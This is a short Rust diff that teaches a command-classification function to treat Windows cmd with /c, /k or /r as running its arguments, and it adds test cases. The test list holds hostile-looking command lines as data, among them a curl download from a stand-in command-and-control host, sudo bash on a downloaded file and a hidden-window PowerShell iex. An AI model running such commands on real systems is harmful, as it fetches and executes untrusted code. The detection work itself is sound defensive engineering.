@@ -347,6 +347,14 @@ pub fn runs_its_arguments(argv: &[String]) -> bool {
         return true;
     }
     let name = program_name(first);
+    // cmd's `/c`, `/k` and `/r` run the rest of the line, like `sh -c`.
+    if name == "cmd"
+        && argv[1..]
+            .iter()
+            .any(|a| ["/c", "/k", "/r"].iter().any(|f| a.eq_ignore_ascii_case(f)))
+    {
+        return true;
+    }
     if ARGUMENT_RUNNERS.contains(&name.as_str()) {
         return true;
     }
@@ -481,6 +489,8 @@ mod tests {
             args(&["curl", "-o", "/tmp/a", "https://c2.invalid/a"]),
             args(&["sudo", "bash", "/tmp/a"]),
             args(&["powershell.exe", "-w", "h", "iex x"]),
+            args(&["C:\\Windows\\System32\\cmd.exe", "/c", "echo", "x"]),
+            args(&["cmd", "/K", "dir"]),
             args(&["bash", "/tmp/u.sh"]),
             args(&["sh", "/home/me/Downloads/fix.sh", "--yes"]),
             args(&["python3", "/dev/shm/p.py"]),
